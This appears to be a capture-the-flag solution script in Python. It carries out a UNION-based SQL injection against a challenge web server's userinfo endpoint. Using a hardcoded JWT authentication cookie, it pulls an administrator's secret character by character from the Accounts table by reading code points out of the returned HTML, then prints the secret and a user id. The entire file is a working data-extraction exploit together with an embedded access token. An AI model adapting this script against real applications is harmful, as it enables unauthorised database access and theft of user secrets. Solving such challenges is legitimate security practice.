from bs4 import BeautifulSoup
import requests

import time

BASE_URL = "https://iulplkticahjbflq.ransommethis.net/adrlarozeijppjmg/userinfo?user="
PAYLOAD = "' UNION SELECT uid, unicode(substr(secret, {}, 1)), length(secret), uid from Accounts WHERE userName = 'NervousHiccups"

# Obtained from task 6
AUTH_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjU4Njc4NjIsImV4cCI6MTY5NzQwMzg2Miwic2VjIjoiMXVUMTUza1VITU1IcnFxcUVLYWswS1NxeVM0dmR3VGkiLCJ1aWQiOjI2OTYwfQ.cz2HMiQvSgXGPKQmYsPO1YiyMX2-q7y7aE8nOFX3hK4"

if __name__ == "__main__":
    admin_secret = ""

    with requests.Session() as s:
        # Set authentication cookie
        s.cookies.set("tok", AUTH_TOKEN)

        # We know the secret length beforehand
        for index in range(32):
            # SQL string indexing starts at index 1
            userinfo = s.get(BASE_URL + PAYLOAD.format(index + 1))

            # Use beautifulsoup4 to find the userinfo divs with our injected info
            parsed_body = BeautifulSoup(userinfo.text, features="lxml")
            user_info = parsed_body.find_all("div", {"class": "box"})

            jobs_completed = user_info[1].find("p")

            # Convert the ASCII codepoint back to a character
            secret_char = chr(int(jobs_completed.get_text()))

            # Add character to accumulated phrase & print progress
            admin_secret += secret_char
            print(admin_secret.ljust(32, "_"))

            # respect the server by waiting a bit between requests :)
            time.sleep(0.1)

    # Also fetch user id because we need it anyways
    programs_contributed = user_info[3].find("p")
    uid = programs_contributed.get_text()

    print("=" * 32)
    print(f"Full admin secret: {admin_secret}")
    print(f"NervousHiccups uid: {uid}")
